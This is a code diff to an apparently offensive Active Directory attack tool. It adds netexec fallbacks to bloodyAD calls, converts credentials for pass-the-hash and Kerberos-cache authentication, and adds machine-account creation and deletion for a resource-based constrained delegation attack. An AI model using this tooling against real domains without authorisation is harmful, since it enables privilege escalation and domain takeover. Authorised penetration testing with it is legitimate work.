@@ -267,6 +267,66 @@ class BaseEdgeHandler(ABC):
         )
         return target_str, auth_flags
 
+    def _get_nxc_auth_args(
+        self, principal: str | None = None, include_domain: bool = True
+    ) -> list[str]:
+        """Build netexec-compatible authentication arguments.
+
+        Reuses :meth:`_get_auth_args` (bloodyAD-style) and rewrites it for
+        netexec's CLI surface: bloodyAD uses ``-p`` for both passwords and NT
+        hashes (``-p :NTHASH`` / ``-p LM:NT``) whereas netexec uses ``-p`` for
+        passwords and ``-H`` for NT hashes, and ``-k --use-kcache`` for ccache.
+
+        Shared by all handlers that fall back to netexec, so the conversion
+        lives in one place (was previously duplicated in CanRDPHandler).
+        """
+        domain = self._get_domain() if include_domain else None
+        return self._nxc_auth_from_bloodyad(self._get_auth_args(principal), domain)
+
+    @staticmethod
+    def _nxc_auth_from_bloodyad(
+        args: list[str], domain: str | None = None
+    ) -> list[str]:
+        """Convert bloodyAD-style auth args to netexec's CLI surface.
+
+        bloodyAD uses ``-p`` for both passwords and NT hashes
+        (``-p :NTHASH`` / ``-p LM:NT``); netexec uses ``-p`` for passwords and
+        ``-H`` for NT hashes, and ``-k --use-kcache`` for ccache.  Kept static
+        so callers holding raw bloodyAD args (e.g. the RBCD staged-computer
+        helper) can convert without re-deriving from the credential store.
+        """
+        nxc_args: list[str] = []
+        i = 0
+        while i < len(args):
+            flag = args[i]
+            if flag == "-u" and i + 1 < len(args):
+                nxc_args.extend(["-u", args[i + 1]])
+                i += 2
+            elif flag == "-p" and i + 1 < len(args):
+                value = args[i + 1]
+                if value.startswith(":") or (
+                    ":" in value and len(value.replace(":", "")) == 32
+                ):
+                    # bloodyAD -p :NTHASH or -p LMHASH:NTHASH → nxc -H NTHASH
+                    nxc_args.extend(["-H", value.split(":")[-1]])
+                else:
+                    nxc_args.extend(["-p", value])
+                i += 2
+            elif flag == "-k":
+                nxc_args.extend(["-k", "--use-kcache"])
+                i += 1
+            elif flag == "-c" and i + 1 < len(args):
+                # netexec has no direct cert-auth flag; drop it.
+                i += 2
+            elif flag == "--dc-ip":
+                i += 2 if (i + 1 < len(args)) else 1
+            else:
+                i += 1
+
+        if domain:
+            nxc_args.extend(["-d", domain])
+        return nxc_args
+
     # ------------------------------------------------------------------
     # Utility helpers
     # ------------------------------------------------------------------
@@ -371,17 +431,32 @@ class BaseEdgeHandler(ABC):
         (Administrator, then the foothold) before falling back to the creator.
         """
         from pathstrike.tools import bloodyad_wrapper as bloody
+        from pathstrike.tools import netexec_wrapper as nxc
 
+        domain = self._get_domain()
+        dc_ip = self._get_dc_host()
         for who in ("Administrator", None):
             try:
-                res = await bloody.del_computer(self.config, self._get_auth_args(who), name)
+                bloody_auth = self._get_auth_args(who)
+                res = await bloody.del_computer(self.config, bloody_auth, name)
                 if res.get("success"):
+                    return True
+                # Fallback: netexec add-computer DELETE with the same identity.
+                nxc_res = await nxc.del_computer(
+                    dc_ip, self._nxc_auth_from_bloodyad(bloody_auth, domain), name
+                )
+                if nxc_res.get("success"):
                     return True
             except Exception:  # pragma: no cover - best-effort cleanup
                 pass
         try:
             res = await bloody.del_computer(self.config, write_auth, name)
-            return bool(res.get("success"))
+            if res.get("success"):
+                return True
+            nxc_res = await nxc.del_computer(
+                dc_ip, self._nxc_auth_from_bloodyad(write_auth, domain), name
+            )
+            return bool(nxc_res.get("success"))
         except Exception:  # pragma: no cover - best-effort cleanup
             return False
 
@@ -415,12 +490,29 @@ class BaseEdgeHandler(ABC):
 
         add = await bloody.add_computer(self.config, write_auth, staged_name, staged_pass)
         if not add.get("success"):
-            return (
-                False,
-                f"RBCD: could not create staging computer {staged_sam}: "
-                f"{add.get('error', 'unknown')} (needs ms-DS-MachineAccountQuota > 0).",
-                None,
+            # Fallback: netexec add-computer module (same MAQ-based staging via
+            # a different tool path).
+            from pathstrike.tools import netexec_wrapper as nxc
+
+            self.logger.info(
+                "bloodyAD add_computer failed (%s); falling back to netexec add-computer",
+                add.get("error", "unknown"),
             )
+            nxc_add = await nxc.add_computer(
+                dc_ip,
+                self._nxc_auth_from_bloodyad(write_auth, domain),
+                staged_name,
+                staged_pass,
+            )
+            if not nxc_add.get("success"):
+                return (
+                    False,
+                    f"RBCD: could not create staging computer {staged_sam}: "
+                    f"{add.get('error', 'unknown')} (netexec fallback: "
+                    f"{nxc_add.get('error', 'unknown')}; needs "
+                    "ms-DS-MachineAccountQuota > 0).",
+                    None,
+                )
         try:
             rb = await bloody.set_rbcd(self.config, write_auth, rbcd_target_sam, staged_sam)
             if not rb.get("success"):
